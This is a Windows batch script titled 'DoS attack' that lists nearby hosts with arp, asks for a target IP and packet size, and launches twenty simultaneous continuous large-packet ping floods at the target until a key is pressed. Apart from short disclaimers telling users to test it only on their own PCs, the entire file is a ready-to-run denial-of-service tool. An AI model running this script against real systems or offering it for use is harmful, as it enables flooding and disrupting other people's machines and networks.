:: Attention! You are only allowed to test this with your own PCs. ::
:: Don't use it with foreign PCs! ::
:: I am not responsible for any damage! ::
:: You are doing this at your own risk! ::








@echo off
MODE 65, 25
color A
title DoS attack
echo Attention! You are only allowed to test this with your own PCs.
echo Don't use it with foreign PCs!
echo I am not responsible for any damage!
echo You are doing this at your own risk!
echo.
Timeout /T 3 /NoBreak>nul
echo.
echo.
echo.
echo -----------------------------------------------------------------
echo -----------------------------------------------------------------
echo                            DoS attack 
echo -----------------------------------------------------------------
echo -----------------------------------------------------------------
echo.
echo.
arp -a
echo.
echo.
set /p IP=Please type in the IP adress. 
set /p B=Please type in the buffer length (up to 65000). 
echo.
echo Press any key to cancel.
echo.
Start C:\Windows\System32\Ping -a %IP% -t -l %B%
Start C:\Windows\System32\Ping -a %IP% -t -l %B%
Start C:\Windows\System32\Ping -a %IP% -t -l %B%
Start C:\Windows\System32\Ping -a %IP% -t -l %B%
Start C:\Windows\System32\Ping -a %IP% -t -l %B%
Start C:\Windows\System32\Ping -a %IP% -t -l %B%
Start C:\Windows\System32\Ping -a %IP% -t -l %B%
Start C:\Windows\System32\Ping -a %IP% -t -l %B%
Start C:\Windows\System32\Ping -a %IP% -t -l %B%
Start C:\Windows\System32\Ping -a %IP% -t -l %B%
Start C:\Windows\System32\Ping -a %IP% -t -l %B%
Start C:\Windows\System32\Ping -a %IP% -t -l %B%
Start C:\Windows\System32\Ping -a %IP% -t -l %B%
Start C:\Windows\System32\Ping -a %IP% -t -l %B%
Start C:\Windows\System32\Ping -a %IP% -t -l %B%
Start C:\Windows\System32\Ping -a %IP% -t -l %B%
Start C:\Windows\System32\Ping -a %IP% -t -l %B%
Start C:\Windows\System32\Ping -a %IP% -t -l %B%
Start C:\Windows\System32\Ping -a %IP% -t -l %B%
Start C:\Windows\System32\Ping -a %IP% -t -l %B%
echo Running...
echo.
pause > nul
Taskkill /F /IM PING.EXE>nul
echo.
echo Stopped!
Timeout /T 3 /NoBreak>nul
